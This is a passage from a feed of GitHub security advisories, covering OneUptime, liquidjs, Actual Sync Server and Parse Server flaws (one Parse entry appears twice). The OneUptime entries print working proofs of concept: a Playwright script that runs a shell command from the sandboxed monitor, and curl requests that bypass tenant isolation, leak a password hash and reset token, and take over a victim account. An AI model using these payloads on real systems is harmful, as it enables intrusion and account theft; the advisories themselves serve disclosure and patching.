<li>Synthetic Monitor editor: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/App/FeatureSet/Dashboard/src/Components/Form/Monitor/MonitorStep.tsx#L260-L289">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/App/FeatureSet/Dashboard/src/Components/Form/Monitor/MonitorStep.tsx#L260-L289</a></li>
<li><code>Test Monitor</code> flow: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/App/FeatureSet/Dashboard/src/Components/Form/Monitor/MonitorTest.tsx#L69-L83">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/App/FeatureSet/Dashboard/src/Components/Form/Monitor/MonitorTest.tsx#L69-L83</a></li>
</ul>
<p>For <code>MonitorType.SyntheticMonitor</code>, attacker-controlled <code>customCode</code> is passed into <code>SyntheticMonitor.execute(...)</code>:</p>
<ul>
<li><a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Utils/Monitors/Monitor.ts#L323-L338">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Utils/Monitors/Monitor.ts#L323-L338</a></li>
</ul>
<p><code>SyntheticMonitor.execute(...)</code> then calls <code>VMRunner.runCodeInNodeVM(...)</code> and injects live Playwright objects into the VM context:</p>
<ul>
<li><a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Utils/Monitors/MonitorTypes/SyntheticMonitor.ts#L156-L168">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Utils/Monitors/MonitorTypes/SyntheticMonitor.ts#L156-L168</a></li>
</ul>
<p>Relevant code path:</p>
<pre><code class="language-ts">result = await VMRunner.runCodeInNodeVM({
  code: options.script,
  options: {
    timeout: PROBE_SYNTHETIC_MONITOR_SCRIPT_TIMEOUT_IN_MS,
    args: {},
    context: {
      browser: browserSession.browser,
      page: browserSession.page,
      screenSizeType: options.screenSizeType,
      browserType: options.browserType,
    },
  },
});
</code></pre>
<p><code>VMRunner.runCodeInNodeVM(...)</code> wraps host objects in proxies, but it still forwards normal method calls with the real host <code>this</code> binding. It only blocks a few property names such as <code>constructor</code>, <code>__proto__</code>, <code>prototype</code>, and <code>mainModule</code>:</p>
<ul>
<li>Blocked properties: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L20-L25">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L20-L25</a></li>
<li>Real host <code>this</code> binding during method calls: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L81-L103">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L81-L103</a></li>
<li>Additional context injection into the VM: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L388-L395">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L388-L395</a></li>
</ul>
<p>Because of that, untrusted code can still use legitimate Playwright methods on the injected <code>browser</code> object.</p>
<p>The probe pins Playwright <code>1.58.2</code>:</p>
<ul>
<li><a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/package-lock.json#L4438-L4459">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/package-lock.json#L4438-L4459</a></li>
</ul>
<p>In that version, <code>Browser.browserType()</code> returns a <code>BrowserType</code> object, and <code>BrowserType.launch()</code> accepts attacker-controlled <code>executablePath</code>, <code>ignoreDefaultArgs</code>, and <code>args</code>. Playwright then passes those values into a child-process spawn path.</p>
<p>As a result, a malicious Synthetic Monitor can do this from inside the sandboxed script:</p>
<pre><code class="language-javascript">browser.browserType().launch({
  executablePath: "/bin/sh",
  ignoreDefaultArgs: true,
  args: ["-c", "id"],
});
</code></pre>
<p>Even if Playwright later throws because the spawned process is not a real browser, the command has already executed.</p>
<p>This execution path is reachable through both one-shot monitor testing and normal scheduled monitor execution:</p>
<ul>
<li>Monitor tests fetched by the probe: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Jobs/Monitor/FetchMonitorTest.ts#L55-L85">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Jobs/Monitor/FetchMonitorTest.ts#L55-L85</a></li>
<li>Scheduled monitor execution: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Jobs/Monitor/FetchList.ts#L96-L126">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Jobs/Monitor/FetchList.ts#L96-L126</a></li>
</ul>
<p>This appears distinct from prior <code>node:vm</code> breakout issues because the exploit does not need to recover <code>process</code> from the VM. The dangerous capability is already exposed by design through the injected Playwright object.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Log in to the dashboard as a regular project member.</li>
<li>Go to <code>Monitors</code> -&gt; <code>Create New Monitor</code>.</li>
<li>Select <code>Synthetic Monitor</code>.</li>
<li>In the Playwright code field, paste:</li>
</ol>
<pre><code class="language-javascript"> browser.browserType().launch({
    executablePath: "/bin/sh",
    ignoreDefaultArgs: true,
    args: [
      "-c",
      "id"
    ],
    timeout: 1000,
  }).catch((err) =&gt; {
    console.log(String(err));
  });

  return {
    data: {
      launched: true
    }
  };
</code></pre>
<ol start="5">
<li>Select one browser type, for example <code>Chromium</code>.</li>
<li>Select one screen type, for example <code>Desktop</code>.</li>
<li>Set retry count to <code>0</code>.</li>
<li>Click <code>Test Monitor</code> and choose any probe.</li>
</ol>
<p>Expected result:</p>
<ul>
<li>the monitor execution succeeded and in the Show More Details the command output is shown.<img width="1537" height="220" alt="image" src="https://github.com/user-attachments/assets/4fa5b458-cae9-4ec8-add0-bfc288ee7568"></li>
</ul>
<h3 id="impact">Impact</h3>
<p>This is a server-side Remote Code Execution issue affecting the probe component.</p>
<p>Who is impacted:</p>
<ul>
<li>any OneUptime deployment where an attacker can obtain ordinary project membership</li>
<li>environments where the probe has access to internal services, secrets, Kubernetes metadata, database credentials, proxy credentials, or other cluster-local trust relationships</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OneUptime/oneuptime/security/advisories/GHSA-jw8q-gjvg-8w4q">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-jw8q-gjvg-8w4q</a></li>
<li><a href="https://github.com/OneUptime/oneuptime/releases/tag/10.0.21">https://github.com/OneUptime/oneuptime/releases/tag/10.0.21</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30957">https://nvd.nist.gov/vuln/detail/CVE-2026-30957</a></li>
<li><a href="https://github.com/advisories/GHSA-jw8q-gjvg-8w4q">https://github.com/advisories/GHSA-jw8q-gjvg-8w4q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jw8q-gjvg-8w4q</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-10T01:12:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@oneuptime/common] OneUptime has authorization bypass via client‑controlled is-multi-tenant-query header that leads to cross‑tenant data exposure and account takeover]]></title>
        <id>https://github.com/advisories/GHSA-r5v6-2599-9g3m</id>
        <link href="https://github.com/advisories/GHSA-r5v6-2599-9g3m"/>
        <updated>2026-03-10T18:45:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A low‑privileged user can bypass authorization and tenant isolation in OneUptime <code>v10.0.20</code> by sending a forged <code>is-multi-tenant-query</code> header together with a controlled <code>projectid</code> header.</p>
<p>Because the server trusts this client-supplied header, internal permission checks in <code>BasePermission</code> are skipped and tenant scoping is disabled.</p>
<p>This allows attackers to:</p>
<ol>
<li>Access project data belonging to other tenants</li>
<li>Read sensitive User fields via nested relations</li>
<li>Leak plaintext resetPasswordToken</li>
<li>Reset the victim’s password and fully take over the account</li>
</ol>
<p>This results in cross‑tenant data exposure and full account takeover.</p>
<h3 id="details">Details</h3>
<p>Root cause</p>
<p>The API trusts a client‑controlled header to determine whether a request should bypass authorization checks.</p>
<p>CommonAPI.ts</p>
<pre><code>if (req.headers["is-multi-tenant-query"]) {
  props.isMultiTenantRequest = true;
}
</code></pre>
<p>BasePermission.ts</p>
<pre><code>if (!props.isMultiTenantRequest) {
  TablePermission.checkTableLevelPermissions(...)
  QueryPermission.checkQueryPermission(...)
  SelectPermission.checkSelectPermission(...)
}
</code></pre>
<p>When the attacker sends:</p>
<pre><code>is-multi-tenant-query: true
</code></pre>
<p>the system skips all authorization checks including:</p>
<ul>
<li>Table permission validation</li>
<li>Query permission validation</li>
<li>Select permission validation</li>
<li>Tenant isolation enforcement</li>
</ul>
<p>Additionally, tenant scoping is disabled in <code>TenantPermission</code></p>
<p>Sensitive user data exposure</p>
<p>Projects marked with:</p>
<pre><code>@MultiTenentQueryAllowed(true)
</code></pre>
<p>allow cross-tenant queries when the header is present.</p>
<p>The Project model contains a relation:</p>
<pre><code>createdByUser
</code></pre>
<p>Because select permission checks are skipped, attackers can retrieve sensitive fields from the User model including:</p>
<pre><code>password
resetPasswordToken
webauthnChallenge
</code></pre>
<p>Reset token stored in plaintext</p>
<p>In the password reset flow:</p>
<p>Authentication.ts</p>
<pre><code>resetPasswordToken: token
</code></pre>
<p>The reset token is stored in plaintext in the database.</p>
<p>During password reset:</p>
<pre><code>/api/identity/reset-password
</code></pre>
<p>the server validates the provided token directly.</p>
<p>If an attacker leaks this token through the authorization bypass, they can immediately reset the victim’s password.</p>
<p>Exploitation chain</p>
<ol>
<li>Attacker bypasses tenant isolation using is-multi-tenant-query</li>
<li>Attacker reads victim project</li>
<li>Attacker selects createdByUser.resetPasswordToken</li>
<li>Attacker triggers forgot-password for victim</li>
<li>Attacker retrieves the fresh token via the same query</li>
<li>Attacker calls /api/identity/reset-password</li>
<li>Attacker sets a new password</li>
<li>Attacker logs in as victim</li>
</ol>
<p>This results in full account takeover.</p>
<h3 id="poc">PoC</h3>
<p><strong>Setup:</strong></p>
<ul>
<li>Local OneUptime v10.0.20 instance</li>
<li>Two normal accounts:<ul>
<li>Attacker account owns Project A (<code>7cb77c45-c2e0-42b5-8a28-57aa0dec6e82</code>)</li>
<li>Victim account owns Project B (<code>88ced36b-4c0a-4c12-bdf1-497d60b10b23</code>) with email <code>victim@example.com</code></li>
</ul>
</li>
</ul>
<hr>
<h4 id="chain-1-direct-project-isolation-bypass">Chain 1: Direct Project Isolation Bypass</h4>
<p><strong>1. Read isolation bypass</strong></p>
<pre><code class="language-bash">curl -X POST http://localhost/api/project/get-list \
  -H "authorization: Bearer &lt;attacker_token&gt;" \
  -H "projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82" \
  -H "is-multi-tenant-query: true" \
  -H "content-type: application/json" \
  -d '{
        "query": {},
        "select": {
            "_id": true,
            "name": true,
            "createdOwnerEmail": true
        }
      }'
</code></pre>
<p>Result: Returns both the attacker's and victim's projects:</p>
<pre><code class="language-json">{
  "data": [
    {
      "_id": "88ced36b-4c0a-4c12-bdf1-497d60b10b23",
      "name": "Victim Project",
      "createdOwnerEmail": { "value": "victim@example.com" }
    },
    {
      "_id": "7cb77c45-c2e0-42b5-8a28-57aa0dec6e82",
      "name": "Attacker Project",
      "createdOwnerEmail": { "value": "attacker@example.com" }
    }
  ],
  "count": 2
}
</code></pre>
<ol start="2">
<li>Write isolation bypass</li>
</ol>
<p>Victim project name is initially: Victim Project ORIGINAL</p>
<pre><code>curl -X POST http://localhost/api/project/88ced36b-4c0a-4c12-bdf1-497d60b10b23/update-item \
  -H "authorization: Bearer &lt;attacker_token&gt;" \
  -H "projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82" \
  -H "is-multi-tenant-query: true" \
  -H "content-type: application/json" \
  -d '{"name":"Victim Project EXPLOIT"}'
</code></pre>
<p>Result: Victim project name is updated to "Victim Project EXPLOIT" despite the attacker not being a member of the victim project.</p>
<h4 id="chain-2-account-takeover-via-credential-leakage">Chain 2: Account Takeover via Credential Leakage</h4>
<ol start="3">
<li>Trigger password reset for victim</li>
</ol>
<pre><code>curl -X POST http://localhost/api/identity/forgot-password \
  -H "content-type: application/json" \
  -d "{\"email\":\"victim@example.com\"}"
</code></pre>
<ol start="4">
<li>Leak victim password hash and reset token via tenant bypass</li>
</ol>
<pre><code>curl -X POST http://localhost/api/project/get-list \
  -H "authorization: Bearer &lt;attacker_token&gt;" \
  -H "projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82" \
  -H "is-multi-tenant-query: true" \
  -H "content-type: application/json" \
  -d '{
        "query": {"_id": "88ced36b-4c0a-4c12-bdf1-497d60b10b23"},
        "select": {
          "_id": true,
          "createdByUser": {
            "email": true,
            "password": true,
            "resetPasswordToken": true
          }
        }
      }'
</code></pre>
<p>Result: Sensitive user data is exposed:</p>
<pre><code>{
  "data": [{
    "_id": "88ced36b-4c0a-4c12-bdf1-497d60b10b23",
    "createdByUser": {
      "email": {"value": "victim@example.com"},
      "password": {"value": "faef08e8f2b9e9dfa09c15dfaf043b8aad7761d9712c7e09417d4da2156e33d9"},
      "resetPasswordToken": "4b75e6d0-1aca-11f1-b2d4-698549b693fb"
    }
  }]
}
</code></pre>
<ol start="5">
<li>Take over victim account using leaked token</li>
</ol>
<pre><code># Reset password with leaked token
curl -X POST http://localhost/api/identity/reset-password \
  -H "content-type: application/json" \
  -d '{
    "resetPasswordToken": "4b75e6d0-1aca-11f1-b2d4-698549b693fb",
    "password": "AttackerChosenPassword123!"
  }'

# Login as victim with new password
curl -X POST http://localhost/api/identity/login \
  -H "content-type: application/json" \
  -d '{
    "email": "victim@example.com",
    "password": "AttackerChosenPassword123!"
  }'
</code></pre>
<p>Result: Successful login with attacker-chosen password, original password fails - complete account takeover achieved.</p>
<p>Result: Victim project name is updated despite the attacker not being a member of the victim project.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows a low‑privileged authenticated user to:</p>
<ul>
<li>bypass tenant isolation</li>
<li>access other tenant projects</li>
<li>read sensitive user credential fields</li>
<li>leak plaintext reset tokens</li>
<li>reset victim passwords</li>
<li>fully take over victim accounts</li>
</ul>
<p>Because OneUptime is a multi‑tenant monitoring platform, this allows attackers to compromise any tenant account in the system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OneUptime/oneuptime/security/advisories/GHSA-r5v6-2599-9g3m">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-r5v6-2599-9g3m</a></li>
<li><a href="https://github.com/OneUptime/oneuptime/releases/tag/10.0.21">https://github.com/OneUptime/oneuptime/releases/tag/10.0.21</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30956">https://nvd.nist.gov/vuln/detail/CVE-2026-30956</a></li>
<li><a href="https://github.com/advisories/GHSA-r5v6-2599-9g3m">https://github.com/advisories/GHSA-r5v6-2599-9g3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5v6-2599-9g3m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-10T01:09:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[liquidjs] liquidjs has a path traversal fallback vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wmfp-5q7x-987x</id>
        <link href="https://github.com/advisories/GHSA-wmfp-5q7x-987x"/>
        <updated>2026-03-10T01:04:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>layout</code>, <code>render</code>, and <code>include</code> tags allow arbitrary file access via absolute paths (either as string literals or through Liquid variables when <code>dynamicPartials: true</code> is enabled). This poses a security risk when malicious users are allowed to control the template content or specify the filepath to be included as a Liquid variable.</p>
<h3 id="patches">Patches</h3>
<p>The issue is fixed via <a href="https://github.com/harttle/liquidjs/pull/855">#855</a> and published version 10.25.0 on npm.</p>
<h3 id="workarounds">Workarounds</h3>
<h4 id="change-the-files-in-build-time">Change the files in build time</h4>
<p>In build time, through Shell script or Webpack <code>string-replace-loader</code>, change the file content of correxponding file (depending on your package <code>type</code>, for CommonJS it's <code>dist/liquid.node.js</code>) under <code>dist/</code>, </p>
<pre><code class="language-diff">  if (fs.fallback !== undefined) {
    const filepath = fs.fallback(file)
-   if (filepath !== undefined) yield filepath
+   if (filepath !== undefined) {
+     for (const dir of dirs) {
+       if (!enforceRoot || this.contains(dir, filepath)) {
+         yield filepath
+         break
+       }
+     }
    }
  }
</code></pre>
<h4 id="overriding-by-fs-liquidjs-option">Overriding by <code>fs</code> LiquidJS option</h4>
<p>Adding a <a href="https://liquidjs.com/api/interfaces/FS.html"><code>fs</code> option</a> to override the <a href="https://github.com/harttle/liquidjs/blob/1b85fdaa9c535021f7030a239a64003af26d31b5/src/fs/fs-impl.ts#L36-L40">default <code>fs</code> implementation</a>:</p>
<pre><code class="language-javascript">const { statSync, readFileSync, promises: { stat, readFile } } = require('fs')
const { resolve, extname, dirname, sep } = require('path')

const fs = {
    exists: async (fp) =&gt; { try { await stat(fp); return true; } catch { return false } },
    existsSync: (fp) =&gt; { try { statSync(fp); return true } catch { return false } },
    resolve: (root, file, ext) =&gt; resolve(root, file + (extname(file) ? '' : ext)),
    contains: (root, file) =&gt; {
        const r = resolve(root)
        return file.startsWith(r.endsWith(sep) ? r : r + sep)
    },
    readFile: (fp) =&gt; readFile(fp, 'utf8'),
    readFileSync: (fp) =&gt; readFileSync(fp, 'utf8'),
    fallback: () =&gt; undefined,
    dirname,
    sep
};

const engine = new Liquid({ fs })
</code></pre>
<h3 id="references">References</h3>
<p>Discussions: <a href="https://github.com/harttle/liquidjs/pull/851">https://github.com/harttle/liquidjs/pull/851</a>
Code fix: <a href="https://github.com/harttle/liquidjs/pull/855">https://github.com/harttle/liquidjs/pull/855</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/harttle/liquidjs/security/advisories/GHSA-wmfp-5q7x-987x">https://github.com/harttle/liquidjs/security/advisories/GHSA-wmfp-5q7x-987x</a></li>
<li><a href="https://github.com/harttle/liquidjs/pull/851">https://github.com/harttle/liquidjs/pull/851</a></li>
<li><a href="https://github.com/harttle/liquidjs/pull/855">https://github.com/harttle/liquidjs/pull/855</a></li>
<li><a href="https://github.com/harttle/liquidjs/commit/3cd024d652dc883c46307581e979fe32302adbac">https://github.com/harttle/liquidjs/commit/3cd024d652dc883c46307581e979fe32302adbac</a></li>
<li><a href="https://github.com/advisories/GHSA-wmfp-5q7x-987x">https://github.com/advisories/GHSA-wmfp-5q7x-987x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmfp-5q7x-987x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-10T01:04:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@actual-app/sync-server] Actual Sync Server has an Authenticated Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-27vg-33gh-4hwg</id>
        <link href="https://github.com/advisories/GHSA-27vg-33gh-4hwg"/>
        <updated>2026-03-10T01:02:16.000Z</updated>
        <content type="html"><![CDATA[<h1 id="description">Description</h1>
<p>Actual Sync Server allows authenticated users to upload files through <code>POST /sync/upload-user-file</code>. In versions prior to 26.3.0, improper validation of the user-controlled <code>x-actual-file-id</code> header means that traversal segments (<code>../</code>) can escape the intended directory and write files outside <code>userFiles</code>.</p>
<h2 id="mitigations">Mitigations</h2>
<p>The vulnerability can be mitigated in prior versions by running the sync server in a filesystem sandbox.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-27vg-33gh-4hwg">https://github.com/actualbudget/actual/security/advisories/GHSA-27vg-33gh-4hwg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3089">https://nvd.nist.gov/vuln/detail/CVE-2026-3089</a></li>
<li><a href="https://github.com/actualbudget/actual/pull/7067">https://github.com/actualbudget/actual/pull/7067</a></li>
<li><a href="https://github.com/actualbudget/actual/commit/18072e1d8b5281db43ded8b21433ee177bae9dfa">https://github.com/actualbudget/actual/commit/18072e1d8b5281db43ded8b21433ee177bae9dfa</a></li>
<li><a href="https://fluidattacks.com/advisories/fugue">https://fluidattacks.com/advisories/fugue</a></li>
<li><a href="https://github.com/actualbudget/actual">https://github.com/actualbudget/actual</a></li>
<li><a href="https://github.com/advisories/GHSA-27vg-33gh-4hwg">https://github.com/advisories/GHSA-27vg-33gh-4hwg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-27vg-33gh-4hwg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-10T01:02:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server has Denial of Service (DoS) and Cloud Function Dispatch Bypass via Prototype Chain Resolution]]></title>
        <id>https://github.com/advisories/GHSA-5j86-7r7m-p8h6</id>
        <link href="https://github.com/advisories/GHSA-5j86-7r7m-p8h6"/>
        <updated>2026-03-10T18:44:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can crash the Parse Server process by calling a Cloud Function endpoint with a prototype property name as the function name. The server recurses infinitely, causing a call stack size error that terminates the process.</p>
<p>Other prototype property names bypass Cloud Function dispatch validation and return HTTP 200 responses, even though no such Cloud Functions are defined. The same applies to dot-notation traversal.</p>
<p>All Parse Server deployments that expose the Cloud Function endpoint are affected.</p>
<h3 id="patches">Patches</h3>
<p>The internal handler registries for Cloud Functions, Jobs, Triggers, and Validators have been changed to prevent prototype chain properties from being resolved.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Place a reverse proxy or WAF in front of Parse Server and block requests to <code>Object.prototype</code> property names.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6">https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6</a></li>
<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2</a></li>
<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.13">https://github.com/parse-community/parse-server/releases/tag/8.6.13</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6">https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.13">https://github.com/parse-community/parse-server/releases/tag/8.6.13</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30939">https://nvd.nist.gov/vuln/detail/CVE-2026-30939</a></li>
<li><a href="https://github.com/advisories/GHSA-5j86-7r7m-p8h6">https://github.com/advisories/GHSA-5j86-7r7m-p8h6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5j86-7r7m-p8h6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-10T00:57:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server has Denial of Service (DoS) and Cloud Function Dispatch Bypass via Prototype Chain Resolution]]></title>
        <id>https://github.com/advisories/GHSA-5j86-7r7m-p8h6</id>
        <link href="https://github.com/advisories/GHSA-5j86-7r7m-p8h6"/>
        <updated>2026-03-10T18:44:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can crash the Parse Server process by calling a Cloud Function endpoint with a prototype property name as the function name. The server recurses infinitely, causing a call stack size error that terminates the process.</p>
<p>Other prototype property names bypass Cloud Function dispatch validation and return HTTP 200 responses, even though no such Cloud Functions are defined. The same applies to dot-notation traversal.</p>
<p>All Parse Server deployments that expose the Cloud Function endpoint are affected.</p>
<h3 id="patches">Patches</h3>
<p>The internal handler registries for Cloud Functions, Jobs, Triggers, and Validators have been changed to prevent prototype chain properties from being resolved.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Place a reverse proxy or WAF in front of Parse Server and block requests to <code>Object.prototype</code> property names.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6">https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6</a></li>
<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2</a></li>
<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.13">https://github.com/parse-community/parse-server/releases/tag/8.6.13</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6">https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.13">https://github.com/parse-community/parse-server/releases/tag/8.6.13</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30939">https://nvd.nist.gov/vuln/detail/CVE-2026-30939</a></li>
<li><a href="https://github.com/advisories/GHSA-5j86-7r7m-p8h6">https://github.com/advisories/GHSA-5j86-7r7m-p8h6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5j86-7r7m-p8h6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-10T00:57:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server has denylist `requestKeywordDenylist` keyword scan bypass through nested object placement]]></title>
        <id>https://github.com/advisories/GHSA-q342-9w2p-57fp</id>
        <link href="https://github.com/advisories/GHSA-q342-9w2p-57fp"/>
        <updated>2026-03-10T18:44:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>requestKeywordDenylist</code> security control can be bypassed by placing any nested object or array before a prohibited keyword in the request payload. This is caused by a logic bug that stops scanning sibling keys after encountering the first nested value. Any custom <code>requestKeywordDenylist</code> entries configured by the developer are equally by-passable using the same technique.</p>
<p>All Parse Server deployments are affected. The <code>requestKeywordDenylist</code> is enabled by default.</p>
<h3 id="patches">Patches</h3>
<p>The fix replaces the recursive object scanner with an iterative stack-based traversal that processes all nested values without prematurely exiting the scan loop. This also eliminates a potential stack overflow on deeply nested payloads.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use a Cloud Code <code>beforeSave</code> trigger to validate incoming data for prohibited keywords across all classes.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp">https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp</a></li>
<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1</a></li>
<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.12">https://github.com/parse-community/parse-server/releases/tag/8.6.12</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp">https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.12">https://github.com/parse-community/parse-server/releases/tag/8.6.12</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30938">https://nvd.nist.gov/vuln/detail/CVE-2026-30938</a></li>
<li><a href="https://github.com/advisories/GHSA-q342-9w2p-57fp">https://github.com/advisories/GHSA-q342-9w2p-57fp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q342-9w2p-57fp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-10T00:57:37.000Z</published>
    </entry>
